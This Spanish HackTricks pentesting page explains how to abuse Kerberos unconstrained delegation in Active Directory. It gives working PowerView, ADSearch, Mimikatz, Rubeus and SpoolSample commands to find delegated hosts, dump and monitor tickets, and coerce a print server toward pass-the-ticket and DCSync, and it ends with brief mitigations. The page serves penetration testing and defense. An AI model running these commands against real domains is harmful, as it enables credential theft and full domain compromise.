# Delegación no restringida

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio hacktricks](https://github.com/carlospolop/hacktricks) y [repositorio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Delegación no restringida

Esta es una característica que un Administrador de Dominio puede configurar en cualquier **Equipo** dentro del dominio. Entonces, cada vez que un **usuario inicia sesión** en el Equipo, una **copia del TGT** de ese usuario se enviará dentro del TGS proporcionado por el DC **y se guardará en la memoria en LSASS**. Por lo tanto, si tienes privilegios de Administrador en la máquina, podrás **volcar los tickets e impersonar a los usuarios** en cualquier máquina.

Por lo tanto, si un administrador de dominio inicia sesión en un Equipo con la característica de "Delegación no restringida" activada, y tienes privilegios de administrador local en esa máquina, podrás volcar el ticket e impersonar al Administrador de Dominio en cualquier lugar (escalada de privilegios de dominio).

Puedes **encontrar objetos de Equipo con este atributo** verificando si el atributo [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) contiene [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Puedes hacer esto con un filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que es lo que hace powerview:

<pre class="language-bash"><code class="lang-bash"># Listar equipos sin restricciones
## Powerview
Get-NetComputer -Unconstrained #Los DC siempre aparecen pero no son útiles para la escalada de privilegios
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Exportar tickets con Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Forma recomendada
kerberos::list /export #Otra forma

# Monitorear inicios de sesión y exportar nuevos tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verificar cada 10s nuevos TGTs</code></pre>

Carga el ticket del Administrador (o usuario víctima) en memoria con **Mimikatz** o **Rubeus para un** [**Pasar el Ticket**](pass-the-ticket.md)**.**\
Más información: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Más información sobre la delegación no restringida en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forzar Autenticación**

Si un atacante es capaz de **comprometer un equipo permitido para "Delegación no restringida"**, podría **engañar** a un **servidor de impresión** para **iniciar sesión automáticamente** contra él **guardando un TGT** en la memoria del servidor.\
Luego, el atacante podría realizar un **ataque de Pasar el Ticket para impersonar** la cuenta de usuario del servidor de impresión.

Para hacer que un servidor de impresión inicie sesión contra cualquier máquina, puedes usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si el TGT es de un controlador de dominio, podrías realizar un ataque [**DCSync**](acl-persistence-abuse/#dcsync) y obtener todos los hashes del DC.\
[**Más información sobre este ataque en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Aquí hay otras formas de intentar forzar una autenticación:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigación

* Limitar los inicios de sesión de DA/Admin a servicios específicos
* Establecer "La cuenta es sensible y no se puede delegar" para cuentas privilegiadas.
